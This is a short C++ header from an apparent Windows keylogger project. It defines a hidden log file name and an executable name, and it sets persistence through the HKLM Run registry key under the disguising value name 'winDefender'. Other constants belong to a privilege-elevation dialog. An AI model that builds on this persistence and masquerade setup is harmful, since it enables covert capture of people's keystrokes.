#pragma once

#include<Windows.h>
#include <windowsx.h>
#include<iostream>
#include<fstream>
#include<string>
#include "Logger.h"

#define LOG_FILE_NAME "\\userdata.win"
#define KEYLOG_NAME  "\\michifu.exe"
#define HKEY_KEYLOGGER HKEY_LOCAL_MACHINE
#define HKEY_KEYLOGGER_SUB "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define HKEY_KEYLOGER_VALUE "winDefender"
#define IDD_MAINDIALOG                  103
#define IDC_BUTTON_ELEVATE              1000
#define IDC_STATIC_INADMINGROUP         1001
#define IDC_STATIC_ISRUNASADMIN         1002
#define IDC_STATIC_ISELEVATED           1003
#define IDC_STATIC_IL                   1004
#define IDC_STATIC                      -1
#define MAX_PATH						256

#ifdef APSTUDIO_INVOKED
	#ifndef APSTUDIO_READONLY_SYMBOLS
		#define _APS_NO_MFC                     1
		#define _APS_NEXT_RESOURCE_VALUE        129
		#define _APS_NEXT_COMMAND_VALUE         32771
		#define _APS_NEXT_CONTROL_VALUE         1005
		#define _APS_NEXT_SYMED_VALUE           110
	#endif
#endif